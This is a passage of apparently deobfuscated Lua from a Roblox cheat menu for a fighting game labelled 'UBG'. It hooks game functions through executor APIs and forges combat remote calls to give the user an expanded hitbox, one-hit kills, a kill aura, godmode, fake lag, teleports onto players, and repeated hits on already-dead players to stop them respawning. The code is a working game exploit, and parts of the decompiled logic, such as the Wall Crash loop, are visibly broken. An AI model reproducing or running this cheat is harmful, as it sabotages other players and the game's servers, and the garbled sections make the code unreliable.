									v33:FireServer(v34, "", 4, 69, { BestHitCharacter = nil, HitCharacters = arg, Ignore = {}, Actions = {} })
								end
							end

							local function fn75()
								if type(Hit.Process) ~= "function" then
									return
								end

								if not process then
									process = Hit.Process
								end

								Hit.Process = function(...)
									local v30, v31, v32 = process(...)
									local v33, v34 = fn68(v30, v31)
									if type(v34) ~= "table" or #v34 == 0 then
										return v33, v34, v32
									end
									fn73()
									pcall(fn74, v34)
									return v33, v34, v32
								end
							end

							local function fn76()
								if not process then
									return
								end
								Hit.Process = process
							end

							local function fn77(arg)
								local dash = playerScripts:WaitForChild("Combat"):WaitForChild("Dash")

								for _, v30 in pairs(getgc(true)) do
									if typeof(v30) ~= "function" then
										continue
									end

									if getfenv(v30).script == dash and debug.getinfo(v30).name == arg then
										return v30
									end
								end

								return nil
							end

							local punchAnimation = nil
							local vfx = nil

							local v30 = luraph_runtime1(function(arg, arg2, arg3, arg4)
								local v30 = Core
								local cFrame = v30.Services.Camera.CFrame
								local v31 = Clock()
								local str3 = tostring(v31)
								local v32 = nil
								local v33 = nil
								local v34 = nil
								local v35 = nil
								local v36 = nil
								local flag2 = false
								local flag3 = false

								local function fn78(arg5, arg6, arg7, arg8, arg9)
									local v37 = v30.Get("Combat", "Ragdoll").GetRagdollFrame(arg5)
									local v38 = v30.Get("Character", "FullCustomReplication").GetCFrame(arg)
									local v39 = v30.Get("Character", "FullCustomReplication").GetCFrame(arg5)
									local flag4 = not arg7

									if not flag4 then
										if v38 and v39 then
											flag4 = Abs(arg6 + v38.Position.Y - v39.Position.Y) < arg7
										end
									end

									local flag5 = not arg8 or v37 and v37.Velocity.Y < 0
									local flag6 = not arg9

									if not flag6 then
										if v38 and v39 then
											flag6 = v39.Position.Y > v38.Position.Y
										else
											flag6 = v39
										end
									end

									v36 = flag4 and flag5 and flag6
									return v36
								end

								local function fn79(arg5, arg6)
									local v37 = v30.Get("Combat", "Ragdoll").GetRagdollFrame(arg5)
									local flag4 = v30.Get("Combat", "Ragdoll").UpVelocities[arg5]

									if v37 then
										if v37.Velocity.Y < 0 and flag4 then
											flag4 = flag4 > 1 and arg6.CollisionGroup ~= "NoCharacterCollisions"
										else
											flag4 = false
										end
									end

									return flag4
								end

								local function fn80(arg5, arg6, arg7)
									if v30.Library("Instance").Exists(arg2) then
										local v37, v38 = v30.Get("Combat", "Hit").Box(nil, arg, {
											Size = arg5,
											Offset = arg6,
											IgnoreJump = true,
											IgnoreRagdolls = "Ground",
											IgnoreKnockback = true,
											NoBaseValidation = true,
											RequireInFront = true,
											BlockHitsThroughWalls = true,
											CustomValidation = arg7,
										})

										v33 = v37
										v32 = v38

										local v39, v40 = v30.Get("Combat", "Hit").Box(nil, arg, {
											Size = arg5,
											Offset = arg6,
											IgnoreJump = true,
											IgnoreRagdolls = "Ground",
											IgnoreKnockback = true,
											RequireInFront = true,
											BlockHitsThroughWalls = true,
											CustomValidation = arg7,
										})

										v35 = v39
										v34 = v40
										return #v32 > 0
									end
								end

								local v37 = v35
								local n4 = 0
								local n5 = 0

								local function fn81(arg5, arg6)
									return (not GetAttribute(arg5, "Ragdoll") or fn78(arg5, 2, 0.25, true)) and arg6.CollisionGroup ~= "NoCharacterCollisions"
								end

								local n6 = 0
								local v38 = nil
								local v39, v40, n7, n8

								while true do
									Wait()
									local cFrame2 = v30.Services.Camera.CFrame
									local v41, v42 = cFrame:ToOrientation()
									local v43, v44 = cFrame2:ToOrientation()
									local v45 = math.deg(v42 - v44)

									if v45 > 180 then
										v45 -= 360
									elseif v45 < -180 then
										v45 += 360
									end

									n6 += v45
									v39 = Max(n5, n6)
									v40 = Min(n4, n6)
									n7 = Clock() - v31
									n8 = arg3 - n7

									if n7 > 0.2125 then
										v38 = fn80(NewVector3(1, 1, 1), NewCFrame(0, 7.5, -0.5), fn79) or fn80(NewVector3(5, 5, 4.5), NewCFrame(0, 0, -2), fn81)
									end

									if not (v38 or arg4 < n7) then
										n4 = v40
										n5 = v39
										cFrame = cFrame2
										continue
									end

									break
								end

								local flag4 = n8 > 0 and true or nil
								v38 = v38 or fn80(NewVector3(7.5, 5, 7), NewCFrame(0, 0, -2.75), fn81)

								if v38 then
									v30.Get("Character", "Move").SetJumpOverride("DashPunch", 0)
									Delay(0.5, v30.Get("Character", "Move").SetJumpOverride, "DashPunch", nil)
								end

								Spawn(function()
									local tbl13 = {
										Guarantees = v37,
										Replace = function(arg5)
											local uppercutThreshold = v30.Get("Combat", "Knockback").CharacterPresets[arg5] == "Uppercut" and tbl12.UppercutThreshold or tbl12.EarlyThreshold

											local ok4, result4 = pcall(function()
												return v30.Get("Combat", "Ragdoll").GetRagdoll(arg5)
											end)

											if not ok4 then
												result4 = nil
											end

											local ok5, result5 = pcall(function()
												return v30.Get("Combat", "Ragdoll").GetRagdollFrame(arg5)
											end)

											if not ok5 then
												result5 = nil
											end

											local flag5 = false

											if arg5 and arg5.GetAttribute then
												pcall(function()
													flag5 = GetAttribute(arg5, "Ragdoll")
												end)
											end

											local flag6 = result4 ~= nil or result5 ~= nil or flag5 == true

											local ok6, result6 = pcall(function()
												return arg5 and v30.Get("Character", "FullCustomReplication").GetCFrame(arg5)
											end)

											ok6 = ok6 and result6
											local forceDirection = nil

											if ok6 then
												forceDirection = arg2.CFrame * Angles(0, Rad(-Clamp(arg2.CFrame:PointToObjectSpace(result6.Position).X * 180 / 2, -180, 180)), 0)
											end

											local getAttribute = arg5 and arg5.GetAttribute
											local flag7 = false

											if getAttribute then
												local ok7, result7 = pcall(function()
													return GetAttribute(arg5, "Knockback")
												end)

												if ok7 and result7 then
													flag7 = true
												end
											end

											if flag6 and tbl12.ForceRagdollAction then
												local tbl13 = { ActionNumbers = { 2, 6 } }
												forceDirection = tbl12.ForceDirection and forceDirection or nil
												tbl13.ForceDirection = forceDirection
												return tbl13
											end

											if n7 < uppercutThreshold then
												if tbl12.ClearKnockback and arg5 and arg5.SetAttribute then
													pcall(function()
														SetAttribute(arg5, "Knockback", false)
													end)
												end

												local tbl13 = { ActionNumbers = { 1, 6 } }
												forceDirection = tbl12.ForceDirection and forceDirection or nil
												tbl13.ForceDirection = forceDirection
												return tbl13
											end

											if v39 - v40 > 180 then
												if result4 then
													fn78(arg5, 0, 2, nil, true)
												end
											end

											local flag8 = flag4 and not result4

											if n7 >= uppercutThreshold and tbl12.ClearKnockback then
												pcall(function()
													if arg5 and arg5.SetAttribute then
														SetAttribute(arg5, "Knockback", false)
													end
												end)
											end

											local n9

											if flag7 then
												n9 = 5
											elseif flag8 then
												n9 = 4
											else
												n9 = 1
											end

											return {
												ActionNumbers = { n9, 6 },
												ForceDirection = tbl12.ForceDirection and (flag8 and forceDirection or nil) or nil,
											}
										end,
										UseFromCFrame = tbl12.UseFromCFrame and flag4 and arg2.CFrame * NewCFrame(0, 0, -2) or nil,
									}

									Wait(0.15)
									flag3 = true
									local v41, v42, v43, v44, v45 = v30.Get("Combat", "Action").Event(nil, arg, "PunchDash", str3, tbl13, 0)

									if v41 then
										vfx("DashHit", v41, arg2.Position)
										v30.Get("Camera", "Shake").Shake(nil, nil, { Amplitude = 1.25, Frequency = 0.0875, FadeInTime = 0.025, FadeOutTime = 0.5 }, nil, arg, table.unpack(v42))
									end

									local blockedCharacters = v45 and (v45.BlockedCharacters or {}) or {}
									local flag5 = false

									for _, v46 in blockedCharacters, nil, nil do
										if not Find(v45.HitCharacters, v46) then
											flag5 = true
										end
									end

									flag2 = flag5
									flag3 = false
								end)

								if n8 > 0 then
									v30.Services.Run.Heartbeat:Wait()
									Wait(n8 + 0.025)
								end

								Spawn(punchAnimation, arg, str3)
								return n8 > 0, v38
							end)

							local function fn78()
								if flag then
									return
								end

								if not punchAnimation then
									punchAnimation = fn77("punchAnimation")
								end

								if not vfx then
									vfx = fn77("vfx")
								end

								local dash = playerScripts:WaitForChild("Combat"):WaitForChild("Dash")

								for _, v31 in pairs(getgc(true)) do
									if typeof(v31) == "function" then
										if getfenv(v31).script == dash and debug.getinfo(v31).name == "runAttack" then
											v29 = v31
											v28 = hookfunction(v31, v30)
											flag = true
											getgenv().LegitKombatEnabled = true
											break
										end
									end
								end
							end

							local function fn79()
								if not flag or not v28 or not v29 then
									return
								end
								hookfunction(v29, v28)
								flag = false
								getgenv().LegitKombatEnabled = false
								v29 = nil
								v28 = nil
							end

							local v31 = v27:CreateModule({
								Id = "UBG_hitbox",
								Name = "Hitbox",
								Default = tbl11.Hitbox,
								Callback = function(hitbox)
									tbl11.Hitbox = hitbox
									fn71(hitbox)
								end,
							})

							v31:CreateToggle({
								Id = "UBG_legit",
								Name = "Legit",
								Default = tbl11.Legit,
								Callback = function(legit)
									tbl11.Legit = legit

									if tbl11.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							v31:CreateToggle({
								Id = "UBG_visualize",
								Name = "Visualize",
								Default = tbl11.Visualize,
								Callback = function(visualize)
									tbl11.Visualize = visualize
								end,
							})

							v31:CreateToggle({
								Id = "UBG_dash_patch",
								Name = "Dash Patch",
								Default = tbl11.DashPatch,
								Callback = function(dashPatch)
									tbl11.DashPatch = dashPatch

									if dashPatch then
										fn78()
									else
										fn79()
									end
								end,
							})

							v31:CreateSlider({
								Id = "UBG_damage_boost",
								Name = "Damage Boost",
								Min = 0,
								Max = 30,
								Default = tbl11.DamageBoost,
								Step = 1,
								Callback = function(damageBoost)
									local flag2 = tbl11.DamageBoost > 0
									tbl11.DamageBoost = damageBoost

									if not flag2 and damageBoost > 0 then
										fn75()
									elseif flag2 and damageBoost <= 0 then
										fn76()
									end
								end,
							})

							v31:CreateSlider({
								Id = "UBG_size_x",
								Name = "Size X",
								Min = 1,
								Max = 200,
								Default = tbl11.SizeX,
								Step = 1,
								Callback = function(sizeX)
									tbl11.SizeX = sizeX

									if tbl11.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							v31:CreateSlider({
								Id = "UBG_size_y",
								Name = "Size Y",
								Min = 1,
								Max = 200,
								Default = tbl11.SizeY,
								Step = 1,
								Callback = function(sizeY)
									tbl11.SizeY = sizeY

									if tbl11.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							v31:CreateSlider({
								Id = "UBG_size_z",
								Name = "Size Z",
								Min = 1,
								Max = 200,
								Default = tbl11.SizeZ,
								Step = 1,
								Callback = function(sizeZ)
									tbl11.SizeZ = sizeZ

									if tbl11.Hitbox then
										fn71(false)
										fn71(true)
									end
								end,
							})

							v27:CreateModule({
								Id = "UBG_silent_block",
								Name = "Silent Block",
								Default = tbl11.SilentBlock,
								Callback = function(silentBlock)
									tbl11.SilentBlock = silentBlock

									coroutine.wrap(function()
										while tbl11.SilentBlock do
											ReplicatedStorage.Remotes.Combat.Block:FireServer(true)
											Wait()
										end

										ReplicatedStorage.Remotes.Combat.Block:FireServer(false)
									end)()
								end,
							})

							tbl11.FakeLagModule = v27:CreateModule({
								Id = "UBG_fake_lag",
								Name = "Fake Lag",
								Default = tbl11.FakeLag,
								Callback = function(fakeLag)
									tbl11.FakeLag = fakeLag

									coroutine.wrap(function()
										while tbl11.FakeLag do
											ReplicatedStorage.Remotes.Services.Ping:FireServer()
											Wait(tbl11.FakeLagInterval)
										end
									end)()
								end,
							})

							tbl11.FakeLagModule:CreateSlider({
								Id = "UBG_fake_lag_interval",
								Name = "Fake Lag Interval",
								Min = 0,
								Max = 0.5,
								Default = tbl11.FakeLagInterval,
								Step = 0.1,
								Callback = function(fakeLagInterval)
									tbl11.FakeLagInterval = fakeLagInterval
								end,
							})

							v27:CreateModule({
								Id = "UBG_fast_attack",
								Name = "Fast Attack",
								Default = false,
								Callback = function(arg)
									ReplicatedStorage.Settings.Multipliers.MeleeSpeed.Value = arg and 300 or 100
								end,
							})

							v27:CreateModule({
								Id = "UBG_one_punch",
								Name = "One Punch",
								Default = false,
								Callback = function(arg)
									ReplicatedStorage.Settings.Multipliers.MeleeDamage.Value = arg and 10000000 or 100
									ReplicatedStorage.Settings.Multipliers.KnockbackPower.Value = arg and 10000 or 100
								end,
							})

							v27:CreateModule({
								Id = "UBG_endless_ult",
								Name = "Endless Ult",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.Endless.Value = value
								end,
							})

							v27:CreateModule({
								Id = "UBG_instant_ult",
								Name = "Instant Ult",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.InstantTransformation.Value = value
								end,
							})

							v27:CreateModule({
								Id = "UBG_multi_ult",
								Name = "Multi Ult",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.MultiUseCutscenes.Value = value
								end,
							})

							v27:CreateModule({
								Id = "UBG_no_hitstun",
								Name = "No Hitstun",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.DisableHitStun.Value = value
								end,
							})

							v27:CreateModule({
								Id = "UBG_no_slow",
								Name = "No Slow",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.NoSlowdowns.Value = value
								end,
							})

							v27:CreateModule({
								Id = "UBG_combat_switch",
								Name = "Combat Switch",
								Default = false,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.DisableCombatTimer.Value = value
								end,
							})

							v27:CreateModule({
								Id = "UBG_no_dash_cd",
								Name = "No Dash CD",
								Default = ReplicatedStorage.Settings.Cooldowns.Dash.Value == 0 and true or false,
								Callback = function(arg)
									ReplicatedStorage.Settings.Cooldowns.Dash.Value = arg and 0 or 100
								end,
							})

							v27:CreateModule({
								Id = "UBG_no_jumpfatigue",
								Name = "No Jump Fatigue",
								Default = ReplicatedStorage.Settings.Toggles.NoJumpFatigue.Value,
								Callback = function(value)
									ReplicatedStorage.Settings.Toggles.NoJumpFatigue.Value = value
								end,
							})

							local v32 = v14:CreateTab({ Id = "ubg-rage", Name = "UBG Rage" })

							local tbl13 = {
								InstantRespawn = false,
								AntiGrab = false,
								WallAbuse = false,
								WallAbuseDelay = 0.1,
								WallAbuseDeath = true,
								CarryAbuse = false,
								KillAura = false,
								AbilityAura = false,
								AbilityAuraMode = "Gon",
								PreventRespawn = false,
								Godmode = false,
								WallCrash = false,
								WallCrashDelay = 0.1,
								TPAll = false,
							}

							local tbl14 = { tp = {}, live = {}, team = {}, died = {}, bum = {} }

							local function fn80()
								local tbl15 = {}
								local tbl16 = {}
								local tbl17 = {}
								local tbl18 = {}
								local tbl19 = {}
								local v33 = GetPlayerList()

								for i = 1, #v33 do
									local v34 = v33[i]

									if not (v34 == LocalPlayer or not CheckState(v34)) then
										local character = v34.Character
										local v35 = character and FindFirstChild(character, "Humanoid")
										local v36 = character and FindFirstChild(character, "HumanoidRootPart")
										local v37 = character and FindFirstChild(character, "Highlight")

										if not (not v35 or not v36 or v37) then
											local character2 = LocalPlayer.Character and FindFirstChild(LocalPlayer.Character, "HumanoidRootPart")
											local huge = math.huge

											if character2 then
												huge = (v36.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
											end

											local v38 = GetAttribute(v34, "Team")

											if v38 and v38 == GetAttribute(LocalPlayer, "Team") then
												Insert(tbl17, { char = character, dist = huge })
											elseif Sub(tostring(Floor(v35.Health)), 1, 1) == "0" then
												if not (huge > 160) then
													Insert(tbl18, { char = character, dist = huge })
												end
											else
												Insert(tbl15, { char = character, dist = huge })

												if not (huge > 80) then
													Insert(tbl16, { char = character, dist = huge })
												end
											end
										end
									end
								end

								local v34 = GetChildren(workspace.Characters.NPCs)

								for i = 1, #v34 do
									local v35 = v34[i]
									local v36 = v35 and FindFirstChild(v35, "Humanoid")
									local v37 = v35 and FindFirstChild(v35, "HumanoidRootPart")

									if not (not v36 or not v37) then
										local character = LocalPlayer.Character and FindFirstChild(LocalPlayer.Character, "HumanoidRootPart")
										local huge = math.huge

										if character then
											huge = (v37.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
										end

										Insert(tbl19, { char = v35, dist = huge })
									end
								end

								Sort(tbl15, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl16, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl17, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl18, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								Sort(tbl19, function(arg, arg2)
									return arg.dist < arg2.dist
								end)

								local tp = {}

								for i = 1, #tbl15 do
									Insert(tp, tbl15[i].char)
								end

								tbl14.tp = tp
								local live = {}

								for i = 1, #tbl16 do
									Insert(live, tbl16[i].char)
								end

								tbl14.live = live
								local team = {}

								for i = 1, #tbl17 do
									Insert(team, tbl17[i].char)
								end

								tbl14.team = team
								local died = {}

								for i = 1, #tbl18 do
									Insert(died, tbl18[i].char)
								end

								tbl14.died = died
								local bum = {}

								for i = 1, #tbl19 do
									Insert(bum, tbl19[i].char)
								end

								tbl14.bum = bum
							end

							coroutine.wrap(function()
								while Wait(0.1) do
									fn80()
								end
							end)()

							getCharacter = function(arg)
								if arg then
									return arg.Data.Character.Value
								end
								return LocalPlayer.Data.Character.Value
							end

							getWallcombo = function(arg)
								return ReplicatedStorage.Characters[arg].WallCombo
							end

							getAbility = function(arg, arg2)
								local v33 = ReplicatedStorage.Characters[arg]
								local v34 = FindFirstChild(v33.Abilities, arg2)

								if GetAttribute(LocalPlayer.Character, "TransformationLoaded") then
									v34 = FindFirstChild(v33.Ultimates, arg2)
								end

								return v34
							end

							execDash = function()
								setthreadidentity(2)
								Core.Library("Remote").Send("Dash", nil, "L", 1)
								setthreadidentity(8)
							end

							Action = function()
								return "Action" .. Random(1000, 9999)
							end

							local function fn81(arg, arg2)
								arg = arg or LocalPlayer.Character
								arg2 = arg2 or 1
								local v33 = getCharacter()
								local v34 = getWallcombo(v33)

								for i = 1, arg2 do
									local v35 = Random(1000000)
									local v36 = Action()
									ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v34, v35)

									ReplicatedStorage.Remotes.Combat.Action:FireServer(v34, "Characters:" .. v33 .. ":WallCombo", 1, v35, {
										HitboxCFrames = { nil },
										BestHitCharacter = arg,
										HitCharacters = { arg },
										Ignore = { [v36] = { arg } },
										DeathInfo = {},
										Actions = { [v36] = {} },
										HitInfo = { Blocked = false, IsFacing = true, IsInFront = true },
										BlockedCharacters = {},
										ServerTime = tick(),
										FromCFrame = nil,
									}, v36)
								end
							end

							local function fn82(arg)
								setthreadidentity(2)
								local v33 = getWallcombo(getCharacter())
								local v34 = Random(1000000)
								Spawn(execDash)
								local position = LocalPlayer.Character.HumanoidRootPart.Position
								Core.Library("Remote").Send("Ability", v33, v34, nil, arg, position)
								local character = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v33, character, 1, v34, { Suggestions = arg }, 0)
								setthreadidentity(8)
							end

							local function fn83(arg)
								setthreadidentity(2)
								local v33 = getWallcombo(getCharacter())
								local v34 = Random(1000000)
								Spawn(execDash)
								local position = LocalPlayer.Character.HumanoidRootPart.Position
								Core.Library("Remote").Send("Ability", v33, v34, nil, arg, position)
								local character = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v33, character, 1, v34, { Suggestions = arg }, 0)
								local character2 = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v33, character2, 2, v34, nil, nil, true)
								local character3 = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v33, character3, 3, v34, nil, nil, true)
								setthreadidentity(8)
							end

							local function fn84(arg)
								local v33 = getWallcombo(getCharacter())
								local v34 = Random(1000000)
								Spawn(execDash)
								ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v33, v34)
								ReplicatedStorage.Remotes.Combat.Action:FireServer(v33, "", 4, v34, { BestHitCharacter = arg, HitCharacters = { arg }, Ignore = {}, Actions = {} })
							end

							local function fn85(arg)
								ReplicatedStorage.Remotes.Character.ChangeCharacter:FireServer(arg)
							end

							local function fn86(arg, arg2)
								local v33 = getAbility(getCharacter(), arg2)
								local v34 = Random(1000000)
								Spawn(execDash)
								local str3 = GetAttribute(LocalPlayer.Character, "TransformationLoaded") and "Ultimates" or "Abilities"
								ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v33, v34)

								ReplicatedStorage.Remotes.Combat.Action:FireServer(v33, getCharacter() .. ":" .. str3 .. ":" .. arg2, 1, v34, {
									HitboxCFrames = { arg.HumanoidRootPart.CFrame },
									BestHitCharacter = arg,
									HitCharacters = { arg },
									Ignore = { Action1687 = { arg } },
									ServerTime = workspace:GetServerTimeNow(),
									HitInfo = { IsFacing = true, IsInFront = true, Blocked = false },
									Actions = { Action1687 = {} },
									FromCFrame = arg.HumanoidRootPart.CFrame,
								}, Action1687)

								ReplicatedStorage.Remotes.Abilities.AbilityCanceled:FireServer(v33)
							end

							local function fn87(arg)
								Spawn(execDash)
								local cFrame = (arg and FindFirstChild(arg, "HumanoidRootPart")).CFrame
								local v33 = getAbility(getCharacter(), "4")
								local v34 = Random(1000000)
								local tbl15 = { 377, 380, 383, 384, 385, 387, 389 }

								for i = 1, 2 do
									ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v33, v34)

									for i2 = 1, 7 do
										local flag2 = i2 <= 2
										local tbl16 = {}

										local tbl17 = {
											HitboxCFrames = { cFrame, cFrame },
											BestHitCharacter = arg,
											HitCharacters = { arg },
											Ignore = flag2 and {} or { ActionNumber1 = { arg } },
											DeathInfo = {},
											BlockedCharacters = {},
											HitInfo = { IsFacing = not flag2, IsInFront = flag2 },
											ServerTime = tick(),
											Actions = flag2 and {} or { ActionNumber1 = {} },
											FromCFrame = cFrame,
										}

										local str3 = "Action" .. tbl15[i2]
										local n4 = i2 == 2 and 0.1 or nil
										tbl16[1] = v33
										tbl16[2] = "Mob:Abilities:4"
										tbl16[3] = i2
										tbl16[4] = v34
										tbl16[5] = tbl17
										tbl16[6] = str3
										tbl16[7] = n4

										if i2 == 7 then
											tbl16[5].RockCFrame = cFrame
										end

										ReplicatedStorage.Remotes.Combat.Action:FireServer(unpack(tbl16))
									end
								end

								local v35 = FindFirstChild(ReplicatedStorage.Remotes.Abilities, "AbilityCanceled")

								if v35 then
									v35:FireServer(mobAbility)
								end
							end

							local cFrame = nil

							v32:CreateModule({
								Id = "UBG_instant_respawn",
								Name = "Instant Respawn",
								Default = false,
								Callback = function(instantRespawn)
									tbl13.InstantRespawn = instantRespawn

									coroutine.wrap(function()
										while tbl13.InstantRespawn and Wait() do
											if not (not LocalPlayer.Character or not FindFirstChild(LocalPlayer.Character, "Humanoid")) then
												if Sub(tostring(Floor(LocalPlayer.Character.Humanoid.Health)), 1, 1) == "0" and not cFrame then
													cFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
													pcall(replicatesignal, LocalPlayer.Kill)

													if LocalPlayer.Character then
														LocalPlayer.Character:BreakJoints()
													end
												end
											end
										end
									end)()
								end,
							})

							Connect(LocalPlayer.CharacterAdded, function(arg)
								if tbl13.InstantRespawn then
									local humanoidRootPart = arg:WaitForChild("HumanoidRootPart", 5)

									if humanoidRootPart then
										Delay(0.2, function()
											humanoidRootPart.CFrame = cFrame
											cFrame = nil
										end)
									end
								end
							end)

							v32:CreateModule({
								Id = "UBG_anti_grab",
								Name = "Anti Grab",
								Default = false,
								Callback = function(antiGrab)
									tbl13.AntiGrab = antiGrab

									coroutine.wrap(function()
										while tbl13.AntiGrab and Wait(0.1) do
											if GetAttribute(LocalPlayer.Character, "Grabbed") then
												SetAttribute(LocalPlayer.Character, "Invalidated", true)

												Delay(0.1, function()
													SetAttribute(LocalPlayer.Character, "Invalidated", false)
												end)
											end
										end
									end)()
								end,
							})

							local v33 = v32:CreateModule({
								Id = "UBG_wall_abuse",
								Name = "Wall Abuse",
								Default = false,
								Callback = function(wallAbuse)
									tbl13.WallAbuse = wallAbuse

									coroutine.wrap(function()
										while tbl13.WallAbuse and Wait(tbl13.WallAbuseDelay) do
											for i = 1, #tbl14.live do
												Spawn(fn83, tbl14.live[i])
												if tbl13.WallAbuse then
													continue
												end
												break
											end
										end
									end)()
								end,
							})

							v33:CreateSlider({
								Id = "UBG_wall_abuse_delay",
								Name = "Delay",
								Min = 1,
								Max = 100,
								Default = tbl13.WallAbuseDelay * 1000,
								Step = 1,
								Callback = function(arg)
									tbl13.WallAbuseDelay = arg / 1000
								end,
							})

							v33:CreateToggle({
								Id = "UBG_wall_abuse_death",
								Name = "Death",
								Default = tbl13.WallAbuseDeath,
								Callback = function(wallAbuseDeath)
									tbl13.WallAbuseDeath = wallAbuseDeath
								end,
							})

							v32:CreateModule({
								Id = "UBG_carry_abuse",
								Name = "Carry Abuse",
								Default = false,
								Callback = function(carryAbuse)
									tbl13.CarryAbuse = carryAbuse

									coroutine.wrap(function()
										while tbl13.CarryAbuse and Wait(0.1) do
											for i = 1, #tbl14.live do
												Spawn(fn82, tbl14.live[i])
											end
										end
									end)()
								end,
							})

							v32:CreateModule({
								Id = "UBG_kill_aura",
								Name = "Kill Aura",
								Default = false,
								Callback = function(killAura)
									tbl13.KillAura = killAura

									coroutine.wrap(function()
										while tbl13.KillAura and Wait(0.01) do
											for i = 1, #tbl14.live do
												Spawn(fn84, tbl14.live[i])
											end
										end
									end)()
								end,
							})

							v32:CreateModule({
								Id = "UBG_ability_aura",
								Name = "Ability Aura",
								Default = false,
								Callback = function(abilityAura)
									tbl13.AbilityAura = abilityAura

									coroutine.wrap(function()
										while tbl13.AbilityAura and Wait(0.01) do
											if tbl13.AbilityAuraMode == "Gon" then
												if getCharacter() ~= "Gon" then
													fn85("Gon")
												end

												for i = 1, #tbl14.live do
													Spawn(fn86, tbl14.live[i], "2")
												end
											else
												if getCharacter() ~= "Mob" then
													fn85("Mob")
												end

												for i = 1, #tbl14.live do
													Spawn(fn87, tbl14.live[i])
												end
											end
										end
									end)()
								end,
							}):CreateSelector({
								Id = "UBG_ability_aura_mode",
								Name = "Mode",
								Options = { "Gon", "Dragon" },
								Default = tbl13.AbilityAuraMode,
								Callback = function(abilityAuraMode)
									tbl13.AbilityAuraMode = abilityAuraMode
								end,
							})

							v32:CreateModule({
								Id = "UBG_prevent_respawn",
								Name = "Prevent Respawn",
								Default = false,
								Callback = function(preventRespawn)
									tbl13.PreventRespawn = preventRespawn

									coroutine.wrap(function()
										while tbl13.PreventRespawn and Wait(0.1) do
											for i = 1, #tbl14.died do
												Spawn(fn84, tbl14.died[i])
												if not (i > 3) then
													continue
												end
												break
											end
										end
									end)()
								end,
							})

							v32:CreateModule({
								Id = "UBG_godmode",
								Name = "Godmode",
								Default = false,
								Callback = function(godmode)
									tbl13.Godmode = godmode

									coroutine.wrap(function()
										while tbl13.Godmode and Wait(0.001) do
											if #tbl14.bum > 0 then
												Spawn(fn82, tbl14.bum[Random(1, #tbl14.bum)])
											elseif #tbl14.team > 0 then
												Spawn(fn82, tbl14.team[Random(1, #tbl14.team)])
											elseif #tbl14.live > 0 then
												Spawn(fn82, tbl14.live[Random(1, #tbl14.live)])
											end
										end
									end)()

									coroutine.wrap(function()
										while tbl13.Godmode and Wait(0.1) do
											Spawn(fn81)
										end
									end)()
								end,
							})

							v32:CreateModule({
								Id = "UBG_wall_crash",
								Name = "Wall Crash",
								Default = false,
								Callback = function(wallCrash)
									tbl13.WallCrash = wallCrash

									coroutine.wrap(function()
										while tbl13.WallCrash and Wait(tbl13.WallCrashDelay) do
											local n4 = #tbl14.bum
											local flag2 = false
											local v34

											if 1 <= 0 then
												if flag2 >= n4 then
													v34 = flag2
													fn81(tbl14.bum[v34], 50)
													flag2 = true
												end
											elseif flag2 <= n4 then
												v34 = flag2
												fn81(tbl14.bum[v34], 50)
												flag2 = true
											end

											if not flag2 then
												local n5 = #tbl14.live
												local n6 = 1

												if 1 <= 0 then
													if not (n6 >= n5) then
														continue
													end
												elseif not (n6 <= n5) then
													continue
												end

												fn81(tbl14.live[n6], 50)
											end
										end
									end)()
								end,
							}):CreateSlider({
								Id = "UBG_wall_crash_delay",
								Name = "Delay",
								Min = 1,
								Max = 100,
								Default = tbl13.WallCrashDelay * 1000,
								Step = 1,
								Callback = function(arg)
									tbl13.WallCrashDelay = arg / 1000
								end,
							})

							v32:CreateModule({
								Id = "UBG_tp_all",
								Name = "TP All",
								Default = false,
								Callback = function(tpAll)
									tbl13.TPAll = tpAll

									coroutine.wrap(function()
										while tbl13.TPAll and Wait(0.1) do
											if not (not LocalPlayer.Character or not FindFirstChild(LocalPlayer.Character, "HumanoidRootPart")) then
												if #tbl14.tp ~= 0 then
													LocalPlayer.Character.HumanoidRootPart.CFrame = tbl14.tp[Random(1, #tbl14.tp)].HumanoidRootPart.CFrame * NewCFrame(0, 1, 0)
												end
											end
										end
									end)()
								end,
							})

							local v34 = v14:CreateTab({ Id = "ubg-misc", Name = "UBG Misc" })
							local tbl15 = { HideVFX = false, HideSound = false, HideOutput = false }
							local tbl16 = {}
							local tbl17 = {}
							local tbl18 = {}

							local function fn88(arg)
								if typeof(arg) ~= "function" or isfunctionhooked(arg) then
									return false
								end
								local v35 = hookfunction

								local v36 = luraph_runtime1(function()
								end)

								v35(arg, v36)
								return true
							end

							local function fn89(arg)
								for i = 1, #arg do
									local v35 = arg[i]

									if isfunctionhooked(v35) then
										restorefunction(v35)
									end
								end

								table.clear(arg)
							end

							local function fn90(arg, arg2)
								local tbl19 = {}
								local v35 = getgc(true)

								for i = 1, #v35 do
									local v36 = v35[i]

									if typeof(v36) == "function" then
										local ok4, result4 = pcall(getfenv, v36)

										if ok4 and result4 and result4.script == arg then
											if not arg2 then
												Insert(tbl19, v36)
												break
											else
												local ok5, result5 = pcall(debug.getinfo, v36)

												if (ok5 and result5.name or ""):lower():find(arg2, 1, true) then
													Insert(tbl19, v36)
												end
											end
										end
									end
								end

								return tbl19
							end

							local function fn91(arg, arg2, arg3)
								if not arg2 then
									fn89(arg)
									return
								end

								if #arg > 0 then
									return
								end
